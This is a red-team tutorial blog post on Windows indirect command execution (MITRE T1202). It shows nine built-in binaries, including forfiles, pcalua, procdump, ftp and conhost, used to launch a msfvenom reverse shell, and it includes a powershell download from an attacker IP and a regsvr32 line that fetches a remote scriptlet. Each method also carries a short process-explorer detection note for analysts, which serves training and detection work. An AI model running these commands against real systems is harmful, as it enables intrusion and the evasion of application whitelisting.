<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/defense-evasion/" rel="category tag">Defense Evasion</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Indirect Command Execution: Defense Evasion (T1202)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/indirect-command-execution-defense-evasion-t1202/" rel="bookmark"><time class="entry-date published" datetime="2022-03-17T18:05:02+00:00">March 17, 2022</time><time class="updated" datetime="2025-06-23T19:30:55+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Red Teams often use Indirect Command Execution as a defense evasion technique in which an adversary tries to bypass certain defense filters that restrict certain types of scripts/executables from running. Various Windows utilities allow users to execute commands, possibly without invoking cmd. For example, if a firewall restricts DLL execution, an adversary can bypass it using a procdump method, or if a whitelist exists on certain executables containing pcalua.exe, an adversary can use it to execute other executables. This article discusses some of these methods.</span></p>
<ul>
<li><span style="color: #000000;"><strong>MITRE TACTIC: Defense Evasion (TA0005)</strong></span></li>
<li><span style="color: #000000;"><strong>MITRE TECHNIQUE ID: T1202 (Indirect Command Execution)</strong></span></li>
</ul>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><span style="color: #000000;">Malicious EXE creation</span></li>
<li><span style="color: #000000;">Method 1 – forfiles.exe</span></li>
<li><span style="color: #000000;">Method 2 – pcalua.exe</span></li>
<li><span style="color: #000000;">Method 3 – procdump.exe (DLL method)</span></li>
<li><span style="color: #000000;">Method 4 – SyncAppvPublishingServer.vbs</span></li>
<li><span style="color: #000000;">Method 5 – wlrmdr.exe</span></li>
<li><span style="color: #000000;">Method 6 – explorer.exe</span></li>
<li><span style="color: #000000;">Method 7 – cmd.exe</span></li>
<li><span style="color: #000000;">Method 8 – ftp.exe</span></li>
<li><span style="color: #000000;">Method 9 – conhost.exe</span></li>
<li><span style="color: #000000;">Method 10 – WSL Only (bash.exe)</span></li>
<li><span style="color: #000000;">Method 11 – WSL Only (wsl.exe)</span></li>
<li><span style="color: #000000;">Conclusion</span></li>
</ul>
<h3><span style="color: #800000;">Malicious EXE Creation</span></h3>
<p><span style="color: #000000;">First, we need to create an executable that will be executed. This is a simple simulation of what might happen in a real-time Red Team scenario. We’ll use msfvenom to create a simple reverse shell. After that, we need to upload this exe into the victim machine using a python server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.89 LPORT=4444 -f exe &gt; shell.exe
python3 -m http.server 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj-wuREGwPxvcNPuPqJBQSjxC7mqPPUdZ2SZZfje33Cs8Z2wDXP1SNQbkWiXJny5VCM9GHzg5H1tSqY4X01wzn4B_siFHCn_Uc16ZI92hh4uAv5GGAX4PC1A45Ezc_U9iBT-i2NCN4YEKIQAdMnVyT2DsB7qZhVTEo0GaoZHPnSc34Vecgj3THrREEytA=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can upload this executable to the already compromised victim device using powershell wget</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.0.89/shell.exe -O C:UsersPublicshell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj0qdPyyS3MywzDFfFtiSNsAdEK1KRIvU_itwrr7rBaJxq9Tc8HptN8XNGZnjfyn7SHcNf4L_MfRBbBgpVu-S7JJA9SwSAbzAItBFlBCI6ebzpywsJnZoJ5_WkJGxLO_MtTiVlnf6-NW6vFo-aHIK44lHqSkG4kYg-8ATKH_f2WTZ34OM5itsWNEww3lA=s16000"/></span></p>
<p><span style="color: #000000;">Now, the file is uploaded in the <strong>C:UsersPublic</strong> directory for further use.</span></p>
<h3><span style="color: #800000;">Method 1 – forfiles</span></h3>
<p><span style="color: #000000;">According to Microsoft, “Selects and runs a command on a file or set of files. This command is most commonly used in batch files.” Here, /p specifies the path where forfiles will search for the search mask defined by /m flag (here, calc.exe). However, anything after the /c flag is the actual command. Hence, forfiles will now run our custom-made shell — a classic example of indirect command execution in Windows.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">forfiles /p c:windowssystem32 /m calc.exe /c C:UsersPublicshell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiAQkSEph-Yc7qfWnPbuDvEXL2O5EWeynYdO3ByEBrDh2VzVAkpKiqsLALM3IdLE3cbZjYIacm8r5KivBkLkzFwX2PovXI1ssUoErvec6RhVjcBvNsmeiL2tOKn_8Knf6us7DQwkSfTKxynKkVqnkAKuDbN1noEKPPRKTehBSmFS0A3X8df9Oih3irzag=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell gets executed!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFj9B8mLP1mapteNLUrDoYnleVfqJougEFcubjAUkgfl7tnrf7FA1gKsGSlKzuKAfgQ4QZE-8KxBAi74goclhGXhWqj76lNkmMyTO6FCwEcIqiiCSuF11C-bFNI74W7xQEu1kL6PAqmgqhnJDVT48Y7Bwwxhle_JV3_TH2dWftrbySKhf0EuBqpNJL-Q=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, forfiles.exe is running a suspicious file “shell.exe”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4s6koj12bPmUKjSqanBl-hJM4PrxBnezPRNOj4EQmGwJzl2aDknPRCWoSc0vbtN488-yJjNykpCpywHBCtZNZ_Xis6xSYMgmyz25a9Dv-fLHrWwtmWZt-3CIcBM6HOhKbZQVfNS7G22aOgxJIolm9xHnjMh16Q-oC8Ahu7p98VNdYXTnkTWmXK8Xw-g=s16000"/></span></p>
<h3><span style="color: #800000;">Method 2 – pcalua.exe</span></h3>
<p><span style="color: #000000;">The Program Compatibility Assistant is an automatic feature of Windows that runs when it detects an older program has a compatibility problem. Because of the utility of this executable, systems more often whitelist it. This can also run custom exe in compatibility mode. We can run our executable using the program with “-a” flag like:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pcalua.exe -a C:UsersPublicshell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi2uq-rNPAJI1FAjDYWp8n-ymHR3EtUbDZmYK07bnDsdVIcsoaoFwcs9Ju2fXIrsuG6uMQ7MrM8YoIRGdUUa8Tt-B-6JpiooWW1eE_eEgu6nsrU4N3VWaAUKMUcJSwhNziYoSfZ4xeS4Q7tlO25kUEcfG4VoEYjASE450YnMM3Tu8P94edsT8Lu5jNjIg=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as we execute the shell!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgyveqzleXR6zalt5plQopUW2PPp27R3k8GwORVU4p1Af9tHCxC5m9vCTneAsHFTePqYyQowwGTx5BlcsyvldUy-okCZMB2e-leC2H7aWwVFCZpWFk3WrYpR8kqTuVm1vWvh3kcPYy-eXNOHNsvM8OthqoQZMAb53HD8nQnHmkgd9A59m4DT01CJuuB6Q=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, shell.exe has spawned as a standalone process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjnZbFzKAkDXV3IgLCpDxDWOjcEyHgrrFaxnIRXa63G8bEXOiM7VtTXi1ieZghS8xLvN56CgVfnhulvhuES_EqjZC3fP9zcqpTnF8VnLM_vy8O_y15nlzPQdB9odSu5W9kyGu93dadEZKPV8zrvJPA1FHjO3eLkidjrZ2jwvRBV8SuiSK-APtEvYcwkog=s16000"/></span></p>
<h3><span style="color: #800000;">Method 3 – procdump.exe (DLL method)</span></h3>
<p><span style="color: #000000;">ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike. The sysinternals team developed this binary, which you can also use to execute a DLL file by utilizing the ‘MiniDumpCallbackRoutine’ exported function. You must provide a valid ongoing process as you will create the memory dump of that process while loading this DLL onto it.</span></p>
<p><span style="color: #000000;">First, we need to create our DLL payload using msfvenom</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp -f dll LHOST=192.168.0.89 LPORT=4444 &gt; shell.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhYLRSUHzHTxEMpK2LIzGRWmD6UbwDEtDr_-FOxwBofbNV4C9ADkGqxO96zlw-a5wFg3qchVFqu1B2dhoEP02Mzhz4n-yZe1jgfQhQZkMAmy0dOHHNHwM6RQ7A6HaonIXuq7NNEOM47KGGqKA5dZiyO9XQyQdAUInuM5gXdZvfYdUzqSrjprivb4Dy2oA=s16000"/></span></p>
<p><span style="color: #000000;">Once, the DLL has been uploaded onto the victim system, using python server and powershell wget utility, procdump can be run with the “-md” option</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:Sysinternalsprocdump.exe -md shell.dll explorer.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEixa5wAW8UKBgZ2gamovgJFlUMAD9YAW1K6YRX0oKhB69vd9n_qo9hqJ6MvZ9z6yoYoxtFI8S8WjnhnZwgx2J97B6HgpbXioBs72hqUX4K0pX3lAMOKhhgbG_QRnXtmMkhnN4wR4pRv1ImstkPWD3W3b3urkf2Ez9wB094VQWjIZgbJGXnItKyfJ6UYCA=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell gets executed!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjDVx8YrFP-uqZA4GDzLFJW1ia0j3vLR6ahCpMVbiyWt7eWtAK2xaqvnFKWwScdboguA5ERvR9xn6BnwCJ6TOoKayTWwVocWY82kIFKPfXbCUTZlKJmm8IHDNkr-UNWazfIJXQrj9pxLZ2wMYFuvDLQ5pTzopBbDsGAjsL32o5p0ZYZMB81hjOl0mMtYg=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, our DLL has been executed using rundll as a child process of procdump.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjrKO0fVMQsSrwbDt3WiXoICik3AThUP3oDu4ZeEVQML_hc7-1CHQ404D74LCutoYhe7GwGvmE_9ASKHjhcNS3ZEbzuQC20KgPbvcU00Gr7vb46oMQpb1m8ivIgmfxCn-sSMTL5luG1GsdSkIDrzgsWrgu-1xybOEH1wCVNsZNNhovGivuhG8claOn3RA=s16000"/></span></p>
<h3><span style="color: #800000;">Method 4 – SyncAppvPublishingServer.vbs</span></h3>
<p><span style="color: #000000;">SyncAppvPublishingServer.vbs is a script available in newer versions on Windows 10 and 11 only. Microsoft develops this and users can utilize it for MS Application Virtualization. Users can also indirectly use it for executing EXE. The .NET cmdlet known as “Start-Process” achieves this.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SyncAppvPublishingServer.vbs "n; Start-Process C:UsersPublicshell.exe"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi51JoJQetwyc_mQt5oHfHeaLdXODKEBhwAzqEuPnL5RLdURtBBspCS68pMrxpf5MjPOGhfkptKIy6cz8ihry6a9hnMROJK5SEGvIz6Bmpkv4csZmpG8j_o2KYX-yAgbukHtBFV_xbuKaSLUIGphmba-zgbyNBjrDeocGNK8PmBplQv5wfIhgV3FPFW-A=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell gets executed!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEijX6I0yLkAnhOzf9EhO9FoSLZpxFt4757t-6KkFjxxEAnvXtPDuXAERujjyg-ujKDqAV-D5V5gSmpTTuKFwkCSLtHpGyYmwCne6Y0fQucARcXdWYUFcClMhVdi1W6pbpqLAt4o1_IUFDRNY1Plj-9UYO23aOtc49ZMWZglh_HMuc3bTzNtbDvHHWm6Xw=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, a conhost has been spawned inside a powershell process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi7EEmM0KIO-tgMkRAm1Bx-1buqfjYzlJr9I-078FRm7f_S6skSP7euJRH2VOdihTbA2wgwkV6OX9sN21QFHGVrqWEw3nz4NN2OQXvOty_Vi_Z-WhY3CIHrsuog4rMJxvWeJLRjAtJRM-MwhkPzm7RHnNBXqXNfIlshJgd3djMQjCEsZTSHvd_d6p8ihQ=s16000"/></span></p>
<p><span style="color: #000000;">Since just passing in the exe’s path can make the VBS script execute it, we can also use the regsrv32 method in Metasploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.89
set lport 1337
set target 3
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi1xPz1hS2IxgvCBLTQ3ygUnFXIrcP0KhK2TuMuniUkcE0FZI3CfAj6tsQUKZ1uaTaQd4vHW_2bShfwrw_vLnbM0DIGOlhqHnJPWu8upLlts-f1AWYxBFjxar-ubp_ezlGCmKesJhAQbdh2f6M99MVqx66G9BCpCzt3O9qttCfaalQaRC4MV37ciQLBiQ=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can inject this command into the SyncAppvPublishingServer.vbs script by giving a break clause and then the one liner.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SyncAppvPublishingServer.vbs "Break; regsvr32 /s /n /u /i:http://192.168.0.89:8080/qYRAgZv3qAaNC.sct scrobj.dll"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgqG1KsczzhWRW8x3HazANBsmyI_VHOk0J-uxm7YXNQu8lOwqe3LOZgIBC1WN7g5kmOABqU4aDbG74oP_xh9_J8GjrnZ1jdpIJ7m-a90JK2g69GSg5ZW1Gk1nQce_qaI1gGy6gDDJv0Kb_wVdGdDn1bPj3FkyAFsinLlhY3jIsTVIAz0evzjdSWhIbjXA=s16000"/></span></p>
<p><span style="color: #000000;">On our Metasploit console, we receive a reverse shell!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgO_2N4tjtyKveH-olTH4fZpNJcRLaQC25Q0pC-nZgaGXCz9B-kURYR-RDPcKg5nVAJrOg-QyvGU88rdmju_6wvCugH__KKEIIJLE-pcMS6mF2vS9VkKFS29seXEjZ5N_PZiNhfbAT3hdtgLvcXxA1520YB--lsQBOggCnbnPM-X2t7lAvwT7WEAvCXvg=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, a conhost has been spawned inside a powershell process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgOXO0Eh_DIXiKud5UwA8fjqPUKeB-_PUCd3I_HOkDoMOfiolvwqLSVHvF_0eNFmhDtON6V3U6ScmP9oifm9pjw2zQqq73yu5SaglsgjVit9lRcMVcKspSfUzCqUw7ohrYjg6h6fpmtVMC73if2jn090bSYJhfDlBNyaF8ZU_BkoXRhAkLGe_fk0-o9RA=s16000"/></span></p>
<h3><span style="color: #800000;">Method 5 – wlrmdr.exe</span></h3>
<p><span style="color: #000000;">Windows Logon Reminder (wlrmdr.exe) is an executable file available by default in Microsoft which often throws up balloon reminders saying that Windows needs to lock and unlock the device in order to update windows login credentials. Here, this tool is taking a bunch of flags for input, making it a potential candidate for <strong data-start="1319" data-end="1349">Indirect Command Execution</strong> scenarios.</span></p>
<p><span style="color: #000000;">-s : Time to show notification in milliseconds. Use 0 to display the notification without a timeout.</span></p>
<p><span style="color: #000000;">-f &lt;x&gt;   One or more of the following values that indicate an icon to display in the notification.</span></p>
<p><span style="color: #000000;">0x00000000 = Do not display an icon.</span></p>
<p><span style="color: #000000;">0x00000001 = Display an information icon.</span></p>
<p><span style="color: #000000;">0x00000002 = Display a warning icon.</span></p>
<p><span style="color: #000000;">0x00000003 = Display an error icon.</span></p>
<p><span style="color: #000000;">0x00000004 = Icon of keys.</span></p>
<p><span style="color: #000000;">0x00000010 = Do not play the associated sound.</span></p>
<p><span style="color: #000000;">x is decimal. To display an information icon without sound = 0x01 + 0x10 = 0x11 = 17 decimal</span></p>
<p><span style="color: #000000;">-t: Text first Line</span></p>
<p><span style="color: #000000;">-m: Text second Line</span></p>
<p><span style="color: #000000;">-u:  Executable to run</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u C:UsersPublicshell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhDq7ZEecb6yay2IZxMuoFnPveACrfzURZCOepDSRKeitTM9CjN412UoMl9keL3oz3Rlz1SbLX1uPC0M9Akch6B50n5TvAZpLWqHERGZbpz6-JHP9NpX2Ts2NnQColfZnIOZEax6v8h6IjENeP-38qZ_y1soCHZeRIscQjzwsvYhGel_1lV4uwGta1VPQ=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell gets executed!</span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, shell.exe as a standalone has been spawned.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjWft7i4-wKiJZoqxZgH__WNHUo0D-Q290MVr2hn0T8TrQSRHpSfaK68V950lt5AA9DL_kgFtDr7sH-RtNLq7RzA43KeY-3B9sTn4MwF72Hxd2G2A1QVahXmIV-mseAPszUpWXYjzh0DXA1ZUC7j6d9jylftt18Hekr9VrZyl6g3daI-2gkQN7YeTnfTQ=s16000"/></span></p>
<h3><span style="color: #800000;">Method 6 – explorer.exe</span></h3>
<p><span style="color: #000000;">When a user opens the file manager, they run the executable Explorer.exe. The path bar, which mentions the current working directory, also serves as a run prompt where entering the name of a binary spawns it (like cmd.exe). Moreover, Explorer.exe spawns the binary as a child process. You can also achieve this via the command line.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">explorer.exe /root,"C:UsersPublicshell.exe"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFFhILJJ_58lfvZjDYd0KdOnRaGtKPj0YBmV9aEgR-zE3ZOFysO-OzBjF2XgRvigahG5IbVC1wgY5SVkvQUuFoGmXBXTo5mtiHa6Q94Rsla8zqAGXb3Yn8KIM_ZZ3wdkLclvpQlFVxDPRMU1Vfk9tHE3PY5aamA7iV3-0lbXV-mJPhAJzYqp-tw-KsEA=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell gets executed!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgsOvCcmxhgWIK_sGBq8OUzrG6P7BAehNWZ4Eci3k-GRi0UK23c_V5Iu6zDr0qesU890wGkyu4qeSQYxR2xJld6WSO2Sqit1GjcOM0U3ebEM1bHpeL1HbpQ4oPYMkOqHmC1Ktq8HSSJ8sho2H0smoW_gTT0owbg-yPPAkT8-18E4tTCqa0VYkKb1CGKEQ=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, cmd.exe has been spawned which in turn runs our shell.exe</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiCrXtqRnJohXGBUYaN-9g96MEFS_RGh2fYX-j_rRx3DfDqDHvo4Z58MtrwS3twkXArTq6xGdmqS8SG_7K3GJRtW8FU6l7SnzZVltRuN71THxsxGe9BWSYrVPIxlmLu6ZRFvu4zxM9j6ho9P2KpZloo6WUT_QioXI0YvTp1--FuK0bIWkRbgGnZQpIbSA=s16000"/></span></p>
<h3><span style="color: #800000;">Method 7 – cmd.exe</span></h3>
<p><span style="color: #000000;">Cmd.exe is the command prompt (terminal) of Windows and is capable of executing binaries using the /c flag. One can indirectly execute a malicious file using cmd.exe like so:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd.exe /c C:UsersPublicshell.exe</pre>
<p><span style="color: #000000;">Moreover, an attacker may also benefit from the lesser-known path traversal execution method. This lets an attacker traverse back to explorer.exe and use that to initiate the process for “shell.exe.” This complicates the analysis part for a blue teamer and is considered better than the previous method.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd.exe /c "ignite.local /../../../../../../../../../../windows/explorer.exe" /root,C:UsersPublicshell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgqmG7357TPZiflCYNmR-zAn6A1_Fy8G6sZgPFJRQQ0gcxsS1YeyObFwBuPShBGCSLAXNkwb-niUD8FAGLb_Nh3kYO1BAnjHEBMhg_6xjpt_RG02tUr12Dl0AZyB_0a6OIeGmsgHDFVUVZaOljSQrPkueoHUPc82-EiU5qaSLEMrZdYkbDlNLHZKw_-JA=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we establish a connection as the shell executes!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEju3issag8G95TqmxLpwPjDjEcdNN2NGIlpeakrYCBARABsCJaIZjWgNhK_SaZ1Hh80tBjxFeK6g_2F605vFvidL0oVGCgsGZBiI4y-wp9CzoO18bvl2VYBh_vhwz1QymNEw0P54P13TvLsRrsDL3yVv3Fr_98IK_K8ro81xzg9QVgUuiXKNiU8Iu2LOw=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, the system has spawned a conhost (masking our shell) as a child process under the explorer.exe process and it is stealthier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg-AwW4oIdW643TkvqkTQziq_K4CGFRViYWspBt8v9cHzz-Bdi64z08azWBgSxb4pItlZMGY25X5sXEyvkO4pGOYVVUcGgVIK_CC_RET46Dsll4upFP41CzPkqfH4eHtafjIl2mIYW93Heo6_6JK6Vd3B2bdIz7egfNbTL6giekJwk0RD_NxmjbS3v7iQ=s16000"/></span></p>
<h3><span style="color: #800000;">Method 8 – ftp.exe</span></h3>
<p><span style="color: #000000;">Newer versions of Windows 10 and 11 come with a ftp.exe binary already included with the default installation. Moreover, the system PATH variable makes it available, and you can execute it from any working directory. Thereafter, we can load the command we want to run in a text file called “script.txt” and execute it using the ftp -s option which executes text files as a script. Hence, we include the explorer.exe command in this script and execute it using ftp.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo !explorer.exe /root,"C:UsersPublicshell.exe" &gt; script.txt &amp;&amp; ftp -s:script.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiPtvd4JhzWG5hmreHbVQzsP1qwQrYKijhJNHpHlrq7eE0OVHw1d0T4qbngV4qNN0s2T6Vp07JiFtcJkKBKjhYVVxI87UqN6SkXXCdkNXp79C582BQ0oKoCoX8r3pxgr1XkK1ypeQeJM1eVg_AwFlIf3Ocmesg_mmjHVbHtcK58AMflqyMHXjGcoAIlqg=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell gets executed!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjbRm30W3bOZn9ka-3C3POt32eh9pfO_j7vw23-bIw_gumr4A4qInUS-hsV6LlfSxpgjacebPZjVNSvKopCSfUuuJeupxeIAzqlIjQy4TuvvGnnSm0N46ujUTUOf_VcCEeZe50xsmVgtKy2j01HoDYnDwqIXaMRuIoDXvziSk0IGraMYROSW_rjADGQDw=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, an ftp instance is running with no notable indication of our shell.exe in processes making it stealthier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjfSfh0YergMJaSDKwYS8r0SwxNVPlEavWAExZ7C-Gw9WnwW4jKNxulnZduBgS30AlMMgEeOZarJTvRxVRjUnzkOvLD_sPK3brXmglepgLatQyR9JMXSmxTMl2bycPmSoZ-v9Mc5eSUjQN2pMJcb0hKKIJWFzW1Rxbi4YyujKFkEMmaS7k_yaJvkdJvig=s16000"/></span></p>
<h3><span style="color: #800000;">Method 9 – conhost.exe</span></h3>
<p><span style="color: #000000;">Conhost.exe stands for Console Host which was introduced with Windows 7. It is sort of a bridge between old school CRSS and cmd.exe. More information can be found here. In simpler terms, it helps Command Prompt to interact with Windows explorer and provides functionality like drag and drop text from explorer to cmd.exe—another technique useful for <strong data-start="1712" data-end="1742">Indirect Command Execution</strong>.</span></p>
<p><span style="color: #000000;">Conhost can also be used to launch arbitrary executables. Depending on which Windows version you are using the results may vary but as per Build 1809, I found it to be working.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">conhost "ignite.local C:UsersPublicshell.exe"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjZZHpX82jke6s87hFOap2lQIqioMPgruyVXVcMW675bELlUzizx8J-3iwQkKGM5tq_JAasQQudoUjqob4gsiDF3L8_b4APEJaK4JKUyKBJtvy7Kp66yJVs6xuR6gLBtOz09NbkoB1qQ_219pT7LoGLsB5vLGxiIkdIXg19hGOiVhVZNBgvJoh_KC_emQ=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we establish a connection as the shell executes!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjEEGYYWdrbEb-sPTdfuGRknSa9H4SphbL5CzkyTZwpZFDsN5PrunOBdmZbD9IZ767-XRIR3K4gAsiQnkKNi63E-WsRYBb7cdgGmy_wuCPHDhvUQgayFfZOPumDqQufuG_aRR961XnYk7blv5gScQ5U4m2xrdS9DloQHcgbCl71ruUCq9R3MDpaGtMo-w=s16000"/></span></p>
<h5><span style="color: #000000;"><strong>Inspection in process explorer: </strong></span></h5>
<p><span style="color: #000000;">In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, a cmd.exe process has launched a conhost instance. It remains stealthy compared to other methods as the process explorer doesn’t show shell.exe.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjH5eLwKd_X3pEU-jD03LcP9_eNE3erbe3sQh3Cmh8MTCVavfLcx2p62SeWTY-JZWzLKRd0pWz0M8vecbiuOxTEUfZgXPwmReMAC0PWp_4-A7pB5O30u6oJ2qHmLqb_JSKyi-9s1TbRU9aTaOkb-mj2mHeLg-ctAvurdtaYIeTcAkfHtBtGQTEBk_M6ew=s16000"/></span></p>
